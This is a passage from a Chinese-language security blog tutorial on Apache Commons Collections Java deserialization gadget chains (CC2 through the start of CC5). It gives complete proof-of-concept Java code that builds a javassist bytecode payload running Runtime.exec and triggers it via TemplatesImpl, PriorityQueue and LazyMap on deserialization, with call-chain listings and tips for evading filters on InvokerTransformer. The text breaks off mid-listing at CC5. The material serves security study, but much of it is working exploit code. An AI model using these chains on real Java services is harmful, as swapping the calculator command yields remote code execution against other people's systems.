payload.setSuperclass(classPool.get(AbstractTranslet));     <span class="hljs-comment">//设置AbstractTranslet为该类父类</span><br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>); <span class="hljs-comment">//创建一个静态构造方法并将其内容设置为弹calc</span><br>        <span class="hljs-type">byte</span>[] bytes=payload.toBytecode();  <span class="hljs-comment">//将该ctclass转为byte流</span><br>        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;).newInstance();  <span class="hljs-comment">//反射创建TemplatesImpl对象</span><br>        Field field=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);    <span class="hljs-comment">//反射获取属性值_bytecodes</span><br>        field.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//强制反射</span><br>        field.set(templatesImpl,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);   <span class="hljs-comment">//重新设置_bytecodes的值为bytes也就是弹calc</span><br><br>        Field field1=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);    <span class="hljs-comment">//反射获取属性_name</span><br>        field1.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">//强制反射</span><br>        field1.set(templatesImpl,<span class="hljs-string">&quot;test&quot;</span>);   <span class="hljs-comment">//将_name属性赋值为test</span><br>        InvokerTransformer transformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        Field field2=queue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field2.setAccessible(<span class="hljs-literal">true</span>);<br>        field2.set(queue,comparator);<br><br>        Field field3=queue.getClass().getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        field3.setAccessible(<span class="hljs-literal">true</span>);<br>        field3.set(queue,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test.out&quot;</span>));<br>        outputStream.writeObject(queue);<br>        outputStream.close();<br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test.out&quot;</span>));<br>        inputStream.readObject();<br><br>    &#125;<br></code></pre></td></tr></table></figure>

<p>这里对于Code的生成,我们其实有两种办法,一个就是直接去通过javasist技术去生成编译后的代码，另外一个就是去将我们的Class文件直接编译成Base64后再解码输出</p>
<p>那么这条链子的也正好是解决上面CC1的</p>
<p>也就是说对于CC1来说,想要触发到我们的命令执行jdk版本限制是很严格的,那么对于CC2来说,CC2的核心思想就是说想要通过去加载字节码的方式来执行我们的静态代码块的这么一个问题</p>
<p>而通过加载字节码去触发到我们的代码执行的函数链子是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TemplatesImpl.newTransformer()<br>	TemplatesImpl.getTransletInstance()<br>		TemplatesImpl.newInstance()<br></code></pre></td></tr></table></figure>

<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220717201053533.png" alt="image-20220717201053533"></p>
<p>而在这里怎么样才可以去调用到这个封装好的恶意TemplatesImpl对象的newTransformer方法呢</p>
<p>也就是说怎么样才可以去<strong>调用任意对象的某个方法</strong>,那么这里我们想到的又是利用我们的Invoker去调用我们的</p>
<p>这里我们去找到的是一个PriorityQueue类</p>
<p>在这个PriorityQueue类又存在一个这样的利用链:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PriorityQueue.readObject()<br>	PriorityQueue.heapify()<br>		PriorityQueue.siftDown()<br>			 PriorityQueue.siftDownUsingComparator()<br>			 	comparator.compare()<br></code></pre></td></tr></table></figure>

<p>那么这里我们知道最终是会来到这个comparator的这个compare方法</p>
<p>而我们去找到的这个TransformingComparator,就是因为它的这个compare方法中是这样的:<br><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718004034141.png" alt="image-20220718004034141"></p>
<p>其中这里的这个obj1和obj2我们都是可以控制的</p>
<p>那么当我们空着了这个transformer为我们的invokertransformer后,我们也就实现了这个调用任意对象的任意方法的这么一个效果了</p>
<p>这样也就达到了和前面这个Templ链子接轨的这么一个功能了</p>
<p>那么现在我们就挨个挨个来说说重点:</p>
<p>1:为什么一定要设置这个_name属性:</p>
<p>​	我们看到这个地方:</p>
<p>在我们的这个Templ链子中的这个getTransletInstance()方法中:</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718005647138.png" alt="image-20220718005647138"></p>
<p>这里意思是我们的这个_name如果为空的话就会直接return一个null出去</p>
<p>2:</p>
<p>_bytecodes属性是在哪儿用到的</p>
<p>我们进入到这个defineTransletClasses函数中去</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718010614102.png" alt="image-20220718010614102"></p>
<p>这里我们可以看到这个函数中要要求我们的这个_bytecodes属性不能为null</p>
<p>之后会利用</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718010741835.png" alt="image-20220718010741835"></p>
<p>我们loader的defineClass函数将_bytecodes中的全部弄到我们的<code>_class</code>属性中去,也就是将codes还原为这个Class的过程</p>
<p><strong>并且这里我们的这个_bytecodes数组也是一个二维的数组</strong></p>
<p>因为在上面我们也可以看到只有继承了这个类后我们的这个_transletIndex属性才会改变</p>
<p>而它默认是-1，是会报错的</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718010958205.png" alt="image-20220718010958205"></p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718011009045.png" alt="image-20220718011009045"></p>
<p>之后出来后我们就得到了这个_class属性的数组</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718011221951.png" alt="image-20220718011221951"></p>
<p><strong>之后会newInstance的时候,也就是去实例化这个类的时候就会触发到这个静态代码块的执行了</strong></p>
<p>4:怎么把恶意的Templ类带入到我们的这个</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718011529303.png" alt="image-20220718011529303"></p>
<p>里面去的</p>
<p>首先我们去看看在调用compare方法的时候:<br><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718011643194.png" alt="image-20220718011643194"></p>
<p>也就是说对于去调用这个compare方法的时候,这里的这个参数是从这个queue属性中取出来的</p>
<p>,所以我们只需要给这个属性赋上两个值就可以了,对于为什么要附上两个值,这是因为</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718011914902.png" alt="image-20220718011914902"></p>
<p>后续就比较简单了，进入siftDown方法后调用siftDownUsingComparator方法</p>
<p>那么怎么给这个queque属性添加值,这里我们看到这个类中:</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718012059678.png" alt="image-20220718012059678"></p>
<p>是通过这个add方法来添加的,所以现在整个poc也就解释完成了</p>
<p>或者也可以通过反射来进行赋值</p>
<h3 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链:"></a>利用链:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PriorityQueue.readObject()<br>	PriorityQueue.heapify()<br>		PriorityQueue.siftDown()<br>			 PriorityQueue.siftDownUsingComparator()<br>			 	comparator.compare()<br>			 		.............(InvokerTransformer.transform)<br>			 			TemplatesImpl.newTransformer()<br>								TemplatesImpl.getTransletInstance()<br>										TemplatesImpl.newInstance()<br></code></pre></td></tr></table></figure>

<p>所以对于CC2来说特点就是:</p>
<p><strong>依赖为CC4,可以使用javasist技术来构造特定需要的类的Class的codes</strong></p>
<p><strong>可以通过加载继承了这个AbstractTranslet类的Class的codes,从而实现任意代码执行</strong></p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3:"></a>CC3:</h2><p>其实对于CC3来说,它是通过我们的这个CC2和CC1组合起来的</p>
<p>这里我们直接给出我们的poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException, NoSuchFieldException &#123;<br>        String AbstractTranslet=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        String TemplatesImpl=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        ClassPool classPool=ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        CtClass payload=classPool.makeClass(<span class="hljs-string">&quot;CommonsCollections333333333&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] bytes=payload.toBytecode();<br><br>        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;).newInstance();<br>        Field field=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(templatesImpl,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br><br>        Field field1=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        field1.setAccessible(<span class="hljs-literal">true</span>);<br>        field1.set(templatesImpl,<span class="hljs-string">&quot;test&quot;</span>);<br><br><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesImpl&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map lazyMap= LazyMap.decorate(map,chainedTransformer);<br><br>        Class cls=Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);<br>        Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);<br>        Object object=constructor.newInstance(Override.class,map1);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test.out&quot;</span>));<br>        outputStream.writeObject(object);<br>        outputStream.close();<br><br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test.out&quot;</span>));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我们需要注意到几个点:<br>首先在CC3中我们用到的是我们的CC包,而不是我们的CC4这个依赖包</p>
<p>这里还需要去看到另外一个东西:<br>也就是我们的这部分代码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Transformer[] transformers=new Transformer[]&#123;<br>               new ConstantTransformer(TrAXFilter.class),<br>               new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templatesImpl&#125;)<br>       &#125;;<br></code></pre></td></tr></table></figure>

<p>这里我们看到这个InstantiateTransformer的transform方法:<br><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718114924759.png" alt="image-20220718114924759"></p>
<p>我们可以看到这里其实在这个InstantiateTransformer的这个transform的这个方法中会去调用和它这两个参数相关的其他的类的构造方法</p>
<p>而我们看到这个TrAXFilter类的构造方法:</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718115226892.png" alt="image-20220718115226892"></p>
<p>那么这样就和我们CC2的后半部分接轨了</p>
<p><strong>这样就避免了去通过使用我们的invokerTransformer来去调用我们的newTransformer()方法了</strong></p>
<p>那么对于前半部来说,我们还是使用的这个利用CC1的LazyMap去通过代理调用到这个它的get方法,然后通过这个get去触发到我们这整个利用链子的执行</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718115720343.png" alt="image-20220718115720343"></p>
<p><strong>关于这里为什么要传入一个<code>Override.class</code>的问题，其实因为<code>AnnotationInvocationHandler</code>本来就是一个处理注解的类，构造方法的第⼀个参数是⼀个Annotation类类型参数，第二个是map类型参数（所有的注解类型都继承自这个Annotation接口）。在这里面不管传入的是<code>Retention.class</code>还是<code>Override.class</code>都是可行的。</strong></p>
<p>那么这里在什么情况下会用到我们的CC3呢?</p>
<p> 1:依赖为CC依赖而不是CC4依赖的时候</p>
<p>2:不允许使用,或者是过滤了我们的invokerTransfomer这个类的时候</p>
<h3 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链:"></a>利用链:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AnnotationInvocationHandler.readObject()<br>	proxyMap.next()<br>		AnnotationInvocationHandler.invoke()<br>			LazyMap.get()<br>				transformerChain.transform()<br>					ConstantTransformer.transform()<br>						InstantiateTransformer.transform()<br>							TrAXFilter.TrAXFilter()<br>								Templates.newTransformer()<br>									TemplatesImpl.getTransletInstance()<br>										TemplatesImpl.newInstance()<br>											..............<br>												exec<br></code></pre></td></tr></table></figure>

<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4:"></a>CC4:</h2><p>对于CC4来说其实又是我们cc2和cc3的利用结合而已:<br>所以CC4是支持这个collections4.comparators依赖和collections.comparators依赖的</p>
<p>那么这里因为CC4是CC3和CC2的组合,所以我们知道触发到Transformer这一部分肯定是用的CC2的,而后续的命令执行肯定是使用的CC3的,也就是去调用到这个TrAXFilter的构造方法里面去的这部分</p>
<p>那么我们直接给出我们的poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Ez_Java;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException, NoSuchFieldException &#123;<br>        String AbstractTranslet=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        String TemplatesImpl=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        ClassPool classPool=ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        CtClass payload=classPool.makeClass(<span class="hljs-string">&quot;CommonsCollections333333333&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] bytes=payload.toBytecode();<br><br>        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;).newInstance();<br>        Field field=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(templatesImpl,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br><br>        Field field1=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        field1.setAccessible(<span class="hljs-literal">true</span>);<br>        field1.set(templatesImpl,<span class="hljs-string">&quot;test&quot;</span>);<br>        InstantiateTransformer instantiateTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesImpl&#125;);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>((Transformer) instantiateTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        Field field2=queue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field2.setAccessible(<span class="hljs-literal">true</span>);<br>        field2.set(queue,comparator);<br><br>        Field field3=queue.getClass().getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        field3.setAccessible(<span class="hljs-literal">true</span>);<br>        field3.set(queue,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;TrAXFilter.class,TrAXFilter.class&#125;);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test.out&quot;</span>));<br>        outputStream.writeObject(queue);<br>        outputStream.close();<br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test.out&quot;</span>));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>那么这里唯一需要注意的处理就是</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220718172727487.png" alt="image-20220718172727487"></p>
<p><strong>这个地方,因为这里这个TransformingComparator参数的里面不允许出现数组,而我们又需要去避免使用invokertransformer,因为这个会被过滤掉,所以这里我们就直接将它赋值为了我们的这个instantiateTransformer,因为queque这条链子来说会直接去带哦用到它的transform函数,并且该函数的参数也是可控的,所以直接在后面再Add一个这个TrAXFilter即可</strong></p>
<p><strong>那么这里我们也知道其实在CC2中可以通过在comparator中去调用某个类的transform函数,并且参数也是可控的,在这个点上利用得好可以做到许多的跳转</strong></p>
<p>利用链:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PriorityQueue.readObject()<br>	PriorityQueue.heapify()<br>		PriorityQueue.siftDown()<br>			 PriorityQueue.siftDownUsingComparator()<br>			 	comparator.compare()<br>			 		InstantiateTransformer.transform()<br>							TrAXFilter.TrAXFilter()<br>								Templates.newTransformer()<br>									TemplatesImpl.getTransletInstance()<br>										TemplatesImpl.newInstance()<br>											..............<br>												exec<br></code></pre></td></tr></table></figure>

<p>这样就完成了一个拼接</p>
<p>对于CC4的特色来说,也就只是实现了这个不用LazyMap封装动态代理类从而去触发到get这么来触发到transform的执行</p>
<p>而利用的是queque去执行的我们的这个InstantiateTransformer的transform方法</p>
<p>可能会更简略一些</p>
<p>当然如果没有过滤掉这个ChainedTransformer,我们也可以去嵌套一层这个ChainedTransformer到我们的comparator中去,这样的话在add的时候就不用去add这个TrAXFilter.class了</p>
<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5:"></a>CC5:</h2><p>这里我们的这个CC5其实又和我们的CC1是产生了关系的</p>
<p><strong>在CC5链中ysoserial给出的提示是需要JDK1.8并且<code>SecurityManager</code>需要是关闭的</strong>。</p>
<p><strong>(因为在CC5中我们用到了这个InvokerTransformer,而这个我们在CC3中为了绕过他选择了使用InstantiateTransformer的)</strong></p>
<p>先来介绍一下<code>SecurityManager</code>是干嘛的。<code>SecurityManager</code>也就是java的安全管理器，当运行未知的Java程序的时候，该程序可能有恶意代码（删除系统文件、重启系统等），为了防止运行恶意代码对系统产生影响，需要对运行的代码的权限进行控制，这时候就要启用Java安全管理器。该管理器默认是关闭的。</p>
<p>这里我们直接给出我们的poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 